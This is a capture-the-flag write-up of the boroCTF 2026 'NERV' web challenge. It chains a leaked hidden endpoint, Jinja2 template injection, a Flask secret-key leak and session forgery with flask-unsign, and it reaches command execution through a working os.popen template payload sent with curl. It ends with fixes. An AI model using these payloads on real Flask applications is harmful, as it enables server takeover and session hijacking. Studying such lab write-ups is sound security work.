# NERV — SSTI & Flask Session Forgery Writeup

**CTF:** boroCTF 2026  
**Challenge:** NERV  
**Category:** Web  
**Points:** 200  
**Flag:** `boroCTF{c0ngr@tulat!0nS*}`

---

## Description

> NERV HQ internal systems remain online following the Third Impact preliminary event.
>
> Credentials have been issued:
>
> `ikari : eva01`
>
> Do not look for what you have not been given access to.

The challenge is themed around **Neon Genesis Evangelion** and provides valid credentials directly in the challenge description.

---

# Initial Access

The challenge explicitly gives us credentials:

```text
ikari : eva01
```

Logging in:

```bash
curl -s -X POST https://xqpmkotuq78s.boroctf.com/ \
  -d "username=ikari&password=eva01" \
  -c cookies.txt
```

After authentication, the application sets a Flask session cookie:

```text
session=eyJ1c2VyIjoiaWthcmkifQ.ai4hbQ.lRJllX_FYOQznYA5JP_YA76bHVM
```

Decoding the first Base64 section reveals:

```json
{
  "user": "ikari"
}
```

This immediately suggests a Flask application using signed client-side sessions.

---

# Dashboard Enumeration

After logging in, the user is redirected to:

```text
/dashboard
```

Reviewing the dashboard source code revealed an interesting developer comment:

```html
<!-- NOTE: admin reports endpoint moved — see /admin/reports for full personnel data -->
```

This exposed a hidden endpoint:

```text
/admin/reports
```

---

# Testing for SSTI

The `/admin/reports` page accepted user input and rendered it back in the response.

Classic SSTI test:

```text
{{7*7}}
```

Request:

```bash
curl -s -X POST \
  https://xqpmkotuq78s.boroctf.com/admin/reports \
  -b cookies.txt \
  --data-urlencode "query={{7*7}}"
```

Response:

```text
49
```

The expression was evaluated server-side.

**SSTI confirmed.**

The backend was using **Jinja2**.

---

# Information Disclosure

Next step was accessing Flask configuration values:

```jinja2
{{config}}
```

Request:

```bash
curl -s -X POST \
  https://xqpmkotuq78s.boroctf.com/admin/reports \
  -b cookies.txt \
  --data-urlencode "query={{config}}"
```

Among the returned values was the Flask secret key:

```text
N3RV-CLASS1F13D-MAGI-S3CR3T-T0KY0-3
```

This key signs Flask session cookies.

---

# Forging a Session

Using the leaked secret key we can create arbitrary Flask sessions.

Install flask-unsign:

```bash
pip install flask-unsign --break-system-packages
```

Forge a session as Commander Gendo:

```bash
flask-unsign --sign \
  --secret "N3RV-CLASS1F13D-MAGI-S3CR3T-T0KY0-3" \
  --cookie "{'user':'gendo'}" \
  --no-literal-eval
```

Generated cookie:

```text
eyJ1c2VyIjoiZ2VuZG8ifQ.ai4pow.6tH9skJlC6BnK1V-lTokiILI-7A
```

At this point we had full control over session contents.

---

# Remote Code Execution

Since SSTI was already confirmed, we escalated directly to code execution.

A well-known Jinja2 payload:

```jinja2
{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
```

Request:

```bash
curl -s -X POST \
  https://xqpmkotuq78s.boroctf.com/admin/reports \
  -b cookies.txt \
  --data-urlencode "query={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}"
```

Response:

```text
boroCTF{c0ngr@tulat!0nS*}
```

Flag captured.

---

# Attack Chain

```text
Valid credentials
        ↓
Access dashboard
        ↓
Developer comment leaks hidden endpoint
        ↓
Discover /admin/reports
        ↓
SSTI via Jinja2
        ↓
Leak Flask SECRET_KEY
        ↓
Forge Flask session cookies
        ↓
Execute OS commands
        ↓
Read /flag.txt
```

---

# Vulnerabilities

### 1. Information Disclosure

Developer comment exposed a hidden administrative endpoint.

### 2. Server-Side Template Injection (SSTI)

User-controlled input rendered directly inside Jinja2 templates.

### 3. Secret Key Exposure

Flask configuration leaked through SSTI.

### 4. Session Forgery

Knowledge of `SECRET_KEY` allowed arbitrary session creation.

### 5. Remote Code Execution

Jinja2 payloads enabled execution of operating system commands.

---

# Fixes

### Prevent SSTI

Never render user input as a template:

```python
render_template("page.html", query=user_input)
```

Avoid:

```python
render_template_string(user_input)
```

### Protect Secrets

Never expose:

```python
{{config}}
```

or sensitive application objects inside templates.

### Harden Flask Sessions

Use strong random secret keys:

```python
app.secret_key = secrets.token_hex(32)
```

Rotate keys periodically.

### Remove Developer Comments

Hidden endpoints should never appear in production source code.

---

# Flag

```text
boroCTF{c0ngr@tulat!0nS*}
```

---

*Writeup by @elkhaoudari*
